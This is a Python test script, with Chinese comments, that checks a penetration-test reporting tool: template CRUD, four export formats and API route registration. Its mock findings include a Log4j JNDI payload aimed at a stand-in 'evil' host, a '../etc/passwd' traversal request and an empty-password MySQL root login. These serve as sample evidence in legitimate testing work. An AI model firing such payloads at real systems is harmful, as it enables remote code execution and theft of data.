#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""报告质量升级验证脚本 - 测试四种格式导出 + 模板 CRUD + 路由注册"""
import os
import sys
import time
import shutil

# 项目根目录加入 sys.path
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, PROJECT_ROOT)

OUT_DIR = os.path.join(PROJECT_ROOT, "reports", "verify_output")


def make_mock_assessment():
    """构造模拟评估数据: 8 个漏洞 + 6 个端口"""
    now = time.time()
    findings = [
        {"cve": "CVE-2024-1234", "title": "Apache Log4j 远程代码执行",
         "severity": "critical", "description": "攻击者可通过特制日志消息执行任意代码",
         "evidence": "payload: ${jndi:ldap://evil/a}", "cwe": "CWE-917",
         "recommendation": "升级 Log4j 到 2.17.1+", "cvss": 9.8,
         "target": "192.168.1.10", "location": ":8080", "status": "未修复",
         "detected_at": now, "category": "远程代码执行"},
        {"cve": "CVE-2023-9999", "title": "MySQL 未授权访问",
         "severity": "high", "description": "3306 端口暴露且允许空密码登录",
         "evidence": "mysql -h 192.168.1.10 -uroot -p''", "cwe": "CWE-521",
         "recommendation": "绑定本地地址并强制强密码", "cvss": 8.1,
         "target": "192.168.1.10", "location": ":3306", "status": "未修复",
         "detected_at": now, "category": "认证缺陷"},
        {"cve": "CVE-2024-5555", "title": "Nginx 目录遍历",
         "severity": "high", "description": "可通过 ../ 读取任意文件",
         "evidence": "GET /static/../etc/passwd", "cwe": "CWE-22",
         "recommendation": "配置 alias 并规范化路径", "cvss": 7.5,
         "target": "192.168.1.10", "location": ":80", "status": "未修复",
         "detected_at": now, "category": "路径遍历"},
        {"cve": "", "title": "SSH 允许密码登录",
         "severity": "medium", "description": "SSH 服务允许密码认证，易被暴力破解",
         "evidence": "PasswordAuthentication yes", "cwe": "CWE-521",
         "recommendation": "禁用密码登录，改用密钥", "cvss": 5.3,
         "target": "192.168.1.10", "location": ":22", "status": "未修复",
         "detected_at": now, "category": "认证缺陷"},
        {"cve": "CVE-2024-1111", "title": "TLS 证书过期",
         "severity": "medium", "description": "HTTPS 证书已于 30 天前过期",
         "evidence": "notAfter: 2026-08-01", "cwe": "CWE-298",
         "recommendation": "续签证书", "cvss": 4.3,
         "target": "192.168.1.10", "location": ":443", "status": "未修复",
         "detected_at": now, "category": "传输安全"},
        {"cve": "", "title": "FTP 明文传输",
         "severity": "low", "description": "FTP 服务使用明文传输凭据",
         "evidence": "220 (vsFTPd)", "cwe": "CWE-319",
         "recommendation": "改用 SFTP/FTPS", "cvss": 3.1,
         "target": "192.168.1.10", "location": ":21", "status": "未修复",
         "detected_at": now, "category": "传输安全"},
        {"cve": "", "title": "Banner 泄露服务版本",
         "severity": "low", "description": "HTTP 响应头泄露 Nginx 版本号",
         "evidence": "Server: nginx/1.18.0", "cwe": "CWE-200",
         "recommendation": "隐藏 Server 头", "cvss": 2.0,
         "target": "192.168.1.10", "location": ":80", "status": "未修复",
         "detected_at": now, "category": "信息泄露"},
        {"cve": "", "title": "安全响应头缺失",
         "severity": "info", "description": "缺少 HSTS / CSP 等安全头",
         "evidence": "无 Strict-Transport-Security", "cwe": "CWE-693",
         "recommendation": "添加安全响应头", "cvss": 0.0,
         "target": "192.168.1.10", "location": ":443", "status": "未修复",
         "detected_at": now, "category": "安全配置"},
    ]
    ports = [
        {"port": 22, "protocol": "tcp", "service": "ssh", "version": "OpenSSH 8.9", "status": "open"},
        {"port": 21, "protocol": "tcp", "service": "ftp", "version": "vsftpd 3.0", "status": "open"},
        {"port": 80, "protocol": "tcp", "service": "http", "version": "nginx 1.18", "status": "open"},
        {"port": 443, "protocol": "tcp", "service": "https", "version": "nginx 1.18", "status": "open"},
        {"port": 3306, "protocol": "tcp", "service": "mysql", "version": "MySQL 8.0", "status": "open"},
        {"port": 8080, "protocol": "tcp", "service": "http-proxy", "version": "Tomcat 9", "status": "open"},
    ]
    return {
        "assessment_id": "verify-20260912",
        "target": "192.168.1.10",
        "assessment_type": "pentest",
        "started_at": now - 300,
        "completed_at": now,
        "duration": 300.0,
        "overall_risk_score": 82,
        "overall_risk_level": "高危",
        "executive_summary": "本次对目标 192.168.1.10 进行渗透测试，发现 1 个严重、2 个高危、2 个中危、2 个低危、1 个信息级漏洞。建议立即修复 Log4j 远程代码执行漏洞并关闭数据库未授权访问。",
        "key_findings": [
            "Log4j 远程代码执行（严重，CVSS 9.8）",
            "MySQL 3306 未授权访问",
            "Nginx 目录遍历漏洞",
        ],
        "recommendations": [
            "升级 Log4j 到 2.17.1+ 并重启服务",
            "数据库绑定 127.0.0.1 并启用强密码",
            "Nginx 配置规范路径，禁止目录遍历",
            "SSH 禁用密码登录，改用密钥认证",
        ],
        "findings": findings,
        "ports": ports,
        "tools_used": ["nmap", "nessus", "curl", "nikto"],
        "checks_run": ["端口扫描", "漏洞探测", "配置审计", "认证测试"],
    }


def check(name, cond, extra=""):
    status = "PASS" if cond else "FAIL"
    print(f"  [{status}] {name} {extra}")
    return cond


def main():
    print("=" * 60)
    print("报告质量升级 - 完整验证")
    print("=" * 60)

    # 清理输出目录
    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)

    results = {"pass": 0, "fail": 0}

    # ---------- 1. 模块导入 ----------
    print("\n[1] 模块导入检查")
    try:
        from reporting.pdf_exporter import PDFExporter, REPORTLAB_AVAILABLE
        from reporting.word_exporter import WordExporter, DOCX_AVAILABLE
        from reporting.excel_exporter import ExcelExporter, OPENPYXL_AVAILABLE
        from reporting.template_manager import TemplateManager
        from unified.report_generator import UnifiedReportGenerator
        check("reportlab 可用", REPORTLAB_AVAILABLE)
        check("python-docx 可用", DOCX_AVAILABLE)
        check("openpyxl 可用", OPENPYXL_AVAILABLE)
        check("TemplateManager 导入", True)
        check("UnifiedReportGenerator 导入", True)
    except Exception as e:
        check("模块导入", False, str(e))
        return

    # ---------- 2. 模板管理器 CRUD ----------
    print("\n[2] 模板管理器 CRUD")
    tm = TemplateManager()
    tpls = tm.list_templates()
    check("内置模板数量 >= 2", len(tpls) >= 2, f"(实际 {len(tpls)})")

    default = tm.get_default()
    check("默认模板存在", bool(default), f"(id={default.get('id')})")

    # 保存新模板
    new_tpl = tm.save_template({
        "name": "测试客户模板",
        "company_name": "测试科技有限公司",
        "report_title": "渗透测试报告",
        "language": "zh",
    })
    check("保存新模板", bool(new_tpl.get("id")), f"(id={new_tpl['id']})")
    new_id = new_tpl["id"]

    # 更新模板
    updated = tm.update_template(new_id, {"company_name": "更新后的公司名"})
    check("更新模板公司名", updated["company_name"] == "更新后的公司名")

    # 设置默认
    tm.set_default(new_id)
    check("设置默认模板", tm.get_default()["id"] == new_id)
    tm.set_default("default_zh")

    # 删除模板
    deleted = tm.delete_template(new_id)
    check("删除自定义模板", deleted)
    check("删除后不存在", tm.get_template(new_id) is None)

    # 内置模板禁止删除
    try:
        tm.delete_template("default_zh")
        check("内置模板禁止删除", False, "未抛出异常")
    except PermissionError:
        check("内置模板禁止删除", True)

    # ---------- 3. 四种格式导出 ----------
    print("\n[3] 四种格式导出")
    data = make_mock_assessment()
    gen = UnifiedReportGenerator(output_root=OUT_DIR)
    files = {}
    for fmt, ext in [("html", ".html"), ("pdf", ".pdf"), ("docx", ".docx"), ("xlsx", ".xlsx")]:
        try:
            path = gen.generate_report(data, format=fmt, template_id="default_zh")
            exists = os.path.exists(path)
            size = os.path.getsize(path) if exists else 0
            files[fmt] = (path, size)
            check(f"{fmt} 导出", exists and size > 0, f"({size} bytes)")
        except Exception as e:
            check(f"{fmt} 导出", False, str(e))
            files[fmt] = (None, 0)

    # ---------- 4. 内容验收 ----------
    print("\n[4] 内容验收")
    # PDF 必须有中文内容（文件非空且 > 5KB）
    pdf_path, pdf_size = files.get("pdf", (None, 0))
    check("PDF 文件大小 > 5KB", pdf_size > 5000, f"({pdf_size} bytes)")

    # Word 必须有标题和表格
    docx_path, docx_size = files.get("docx", (None, 0))
    if docx_path and os.path.exists(docx_path):
        try:
            from docx import Document
            d = Document(docx_path)
            headings = [p.text for p in d.paragraphs if p.style.name.startswith("Heading")]
            tables = len(d.tables)
            check("Word 有 Heading 标题", len(headings) >= 3, f"({len(headings)} 个)")
            check("Word 有表格", tables >= 2, f"({tables} 个)")
            check("Word 含中文字样", any("执行摘要" in h or "漏洞" in h for h in headings))
        except Exception as e:
            check("Word 内容检查", False, str(e))
    else:
        check("Word 文件存在", False)

    # Excel 必须有多个 Sheet
    xlsx_path, xlsx_size = files.get("xlsx", (None, 0))
    if xlsx_path and os.path.exists(xlsx_path):
        try:
            import openpyxl
            wb = openpyxl.load_workbook(xlsx_path)
            names = wb.sheetnames
            check("Excel 多 Sheet", len(names) >= 4, f"({names})")
            check("含 漏洞清单 Sheet", "漏洞清单" in names)
            check("含 端口清单 Sheet", "端口清单" in names)
            check("含 统计汇总 Sheet", "统计汇总" in names)
            check("含 执行摘要 Sheet", "执行摘要" in names)
            # 检查漏洞清单行数
            ws = wb["漏洞清单"]
            check("漏洞清单数据行 >= 8", ws.max_row >= 9, f"({ws.max_row} 行)")
        except Exception as e:
            check("Excel 内容检查", False, str(e))
    else:
        check("Excel 文件存在", False)

    # HTML 文件
    html_path, html_size = files.get("html", (None, 0))
    check("HTML 文件大小 > 0", html_size > 0, f"({html_size} bytes)")

    # ---------- 5. API 路由注册 ----------
    print("\n[5] API 路由注册")
    try:
        from api_server.reporting_routes import router
        check("reporting_routes router 导入", True)
        check("路由 prefix 正确", router.prefix == "/api/v1/reporting")
        check("路由数量 >= 7", len(router.routes) >= 7, f"({len(router.routes)} 个)")
    except Exception as e:
        check("API 路由导入", False, str(e))

    # ---------- 汇总 ----------
    print("\n" + "=" * 60)
    print("导出文件清单:")
    for fmt, (path, size) in files.items():
        if path:
            print(f"  {fmt:6s}: {size:>8,} bytes  {path}")
    print("=" * 60)


if __name__ == "__main__":
    main()
